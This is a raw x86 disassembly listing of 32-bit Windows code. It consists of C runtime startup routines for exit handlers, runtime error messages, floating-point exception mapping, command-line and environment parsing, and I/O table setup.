  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
